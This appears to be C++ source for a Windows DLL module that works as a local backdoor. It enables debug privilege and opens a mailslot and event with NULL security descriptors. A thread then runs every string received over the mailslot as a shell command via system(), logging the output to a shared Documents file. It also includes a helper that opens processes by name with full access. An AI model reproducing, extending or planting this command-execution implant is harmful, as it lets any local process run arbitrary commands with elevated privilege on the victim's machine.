// AiwpModule.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Windows.h>
#include <process.h>
#include <TlHelp32.h>
#define OUT_TEXT "\"C:\\Documents and Settings\\All Users\\Documents\\1.txt\""
HANDLE g_hMailslot = 0 , g_hEvent = 0 , g_hTunnel = 0;
extern BOOL EnableDebugPrivilege();
DWORD WINAPI RecvThreadProc(LPVOID lpPrameter)
{
	HANDLE hRecvMailSlot = 0;
	DWORD  dwRead = 0;
	char szRecv[255] = {0};
	CHAR szCommand[255] = {0};
	char* lpTemp = NULL;
	while(TRUE)
	{
		OutputDebugString(L"Reading");
		WaitForSingleObject(g_hEvent,INFINITE);
		OutputDebugString(L"Readed");

		if(!ReadFile(g_hMailslot, szRecv, 255, &dwRead, NULL))
			return NULL;

		lpTemp = strstr(szRecv,".");
		if (lpTemp) lpTemp[0] = 0x00;

		wsprintfA(szCommand,"%s >> %s",szRecv,OUT_TEXT);
		for (unsigned char i = 0 ; i <= strlen(szCommand); i++)
		{
			if (szCommand[i] == 0x5C)
				szCommand[i] = 0x2F;
			if(szCommand[i] == '>')
				break;
		}
		system(szCommand);
		DeleteFileA(OUT_TEXT);
		OutputDebugStringA(szCommand);
		ResetEvent(g_hEvent);
	}

	CloseHandle(g_hEvent);
	CloseHandle(g_hMailslot);

	return NULL;
}

HANDLE secCreateEventPort(WCHAR* szNameEvent)
{
	SECURITY_DESCRIPTOR SecDescriptor = {0};
	SECURITY_ATTRIBUTES SecurityAttributes = {0};
	if (InitializeSecurityDescriptor(&SecDescriptor,SECURITY_DESCRIPTOR_REVISION) == FALSE)
		return INVALID_HANDLE_VALUE;
	if(SetSecurityDescriptorDacl(&SecDescriptor,TRUE, NULL, FALSE) == 0)
		return INVALID_HANDLE_VALUE;
	SecurityAttributes.bInheritHandle = TRUE;
	SecurityAttributes.lpSecurityDescriptor = &SecDescriptor;
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	return CreateEvent(&SecurityAttributes,TRUE,FALSE,szNameEvent);
}

HANDLE secCreateMailslot(WCHAR* szMailslotName)
{
	SECURITY_DESCRIPTOR SecDescriptor = {0};
	SECURITY_ATTRIBUTES SecurityAttributes = {0};
	if (InitializeSecurityDescriptor(&SecDescriptor,SECURITY_DESCRIPTOR_REVISION) == FALSE)
		return 0;
	if(SetSecurityDescriptorDacl(&SecDescriptor,TRUE, NULL, FALSE) == 0)
		return 0;
	SecurityAttributes.bInheritHandle = TRUE;
	SecurityAttributes.lpSecurityDescriptor = &SecDescriptor;
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	return CreateMailslot(szMailslotName, 0, 
		MAILSLOT_WAIT_FOREVER, &SecurityAttributes);
}
HANDLE GetProcessHandle(int nID)
{
	return OpenProcess(PROCESS_ALL_ACCESS, FALSE, nID);
}
HANDLE GetProcessHandle(LPCTSTR pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	BOOL fOk;
	for (fOk = Process32First(hSnapshot, &pe); fOk; fOk = Process32Next(hSnapshot, &pe)) {
		if (!wcscmp(pe.szExeFile, pName)) {
			CloseHandle(hSnapshot);
			return GetProcessHandle(pe.th32ProcessID);
		}
	}
	return NULL;
}

int MainClient()
{
	DWORD dwThreadId;
	EnableDebugPrivilege();

	g_hMailslot = secCreateMailslot(L"\\\\.\\mailslot\\slot");

	if(INVALID_HANDLE_VALUE == g_hMailslot){
		OutputDebugString(L"secCreateMailslot Error!");
		goto END;
	}

	g_hEvent = secCreateEventPort(L"ReportEvent");
	if (g_hEvent == INVALID_HANDLE_VALUE){
		OutputDebugString(L"secCreateEventPort Error!");
		goto END;
	}

	g_hTunnel = secCreateMailslot(L"MyTunnel");
	if (g_hEvent == INVALID_HANDLE_VALUE){
		OutputDebugString(L"secCreateMailslot Error!");
		goto END;
	}
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)RecvThreadProc,(LPVOID)&g_hMailslot,0,&dwThreadId);
	while(1) Sleep(1000);

END:
	return 0;
}